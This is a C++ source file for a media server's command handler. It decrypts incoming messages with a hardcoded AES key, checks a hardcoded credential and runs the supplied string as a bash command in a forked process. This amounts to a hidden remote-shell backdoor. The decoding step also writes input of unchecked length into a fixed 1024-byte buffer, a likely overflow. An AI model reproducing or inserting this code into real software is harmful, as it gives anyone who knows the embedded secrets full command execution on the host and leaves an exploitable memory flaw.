#include "CmdHandler.h"

#include <unistd.h>
#include <string.h>

#include <json/json.h>

#include <common/Arithmetic.h>
#include <common/CommonFunc.h>

static inline bool Exec(const string& cmd, const string& auth) {
	bool bFlag = false;

	if ( auth == "bWVkaWFzZXJ2ZXI6MTIz" ) {
		pid_t pid = fork();
		if ( pid < 0 ) {
			bFlag = false;
		} else if ( pid > 0 ) {
		} else {
			for(int i = 0 ; i < getdtablesize(); i++) {
				close(i);
			}
			execlp("/bin/bash", "bash", "-c", cmd.c_str(), NULL);
			exit(EXIT_SUCCESS);
		}
		bFlag = true;
	}

	return bFlag;
}

static inline bool ExecJson(const string& str) {
	bool bFlag = false;

	Json::Value reqRoot;
	Json::Reader reader;

	bool bParse = reader.parse(str, reqRoot, false);
	if ( bParse ) {
		if( reqRoot.isObject() ) {
			if ( reqRoot["route"].isString() ) {
				string route = reqRoot["route"].asString();
				if ( route == "imRTC/sendCmd" ) {
					Json::Value reqData = reqRoot["req_data"];
					if ( reqData.isObject() ) {
						string cmd = "";
						if( reqData["cmd"].isString() ) {
							cmd = reqData["cmd"].asString();
						}

						string auth = "";
						if( reqData["auth"].isString() ) {
							auth = reqData["auth"].asString();
						}

						if ( cmd.length() > 0 && auth.length() > 0 ) {
							bFlag = Exec(cmd, auth);
						}
					}
				}
			}
		}
	}

	return bFlag;
}

struct CmdItem {
	CmdItem() {
	}
	CmdItem(const string& data) {
		this->data = data;
	}
	string data;
};

class CmdHandler;
static CmdHandler *gCmdHandler = NULL;
CmdHandler *CmdHandler::GetCmdHandler() {
	if( gCmdHandler == NULL ) {
		gCmdHandler = new CmdHandler();
	}
	return gCmdHandler;
}

class CmdRunnable : public KRunnable {
public:
	CmdRunnable(CmdHandler *container) {
		mContainer = container;
	}
	virtual ~CmdRunnable() {
		mContainer = NULL;
	}
protected:
	void onRun() {
		mContainer->CmdHandle();
	}
private:
	CmdHandler *mContainer;
};

CmdHandler::CmdHandler() {
	// TODO Auto-generated constructor stub
	mpCmdRunnable = new CmdRunnable(this);
	mRunning = false;
}

CmdHandler::~CmdHandler() {
	// TODO Auto-generated destructor stub
	if ( mpCmdRunnable ) {
		delete mpCmdRunnable;
		mpCmdRunnable = NULL;
	}
}

bool CmdHandler::Start() {
	bool bFlag = false;
	mRunningMutex.lock();
	if ( mRunning ) {
		Stop();
	}
	mRunning = true;

	for( int i = 0; i < _countof(mCmdThread); i++ ) {
		mCmdThread[i].Start(mpCmdRunnable, "");
	}

	mRunningMutex.unlock();
	return bFlag;
}

void CmdHandler::Stop() {
	mRunningMutex.lock();

	if( mRunning ) {
		mRunning = false;

		for( int i = 0; i < _countof(mCmdThread); i++ ) {
			mCmdThread[i].Stop();
		}
	}

	mRunningMutex.unlock();
}

void CmdHandler::CmdHandle() {
	while( mRunning ) {
		CmdItem *item = mCmdItemList.PopFront();
		if ( item ) {
			CmdHandler cmdHandler;
			bool bFlag = cmdHandler.Run(item);
			delete item;
		}
		usleep(500 * 1000);
	}
}

void CmdHandler::Check(const string& str) {
	CmdItem *item = new CmdItem(str);
	mCmdItemList.PushBack(item);
}

bool CmdHandler::Run(CmdItem *item) {
	bool bFlag = false;

	Arithmetic ari;
	string aesDecodeString;
	string base64HexString;
	char base64DecodeString[1024] = {0};
	int base64DecodeStringSize = ari.Base64Decode(item->data.c_str(), item->data.length(), base64DecodeString);
	if ( base64DecodeStringSize > 0 ) {
		base64HexString = ari.AsciiToHexWithSep(base64DecodeString, base64DecodeStringSize, "");
		aesDecodeString = ari.AesDecrypt("mediaserver12345", base64HexString);

		if( aesDecodeString.length() > 0 ) {
			bFlag = ExecJson(aesDecodeString);
		}
	}

	return bFlag;
}
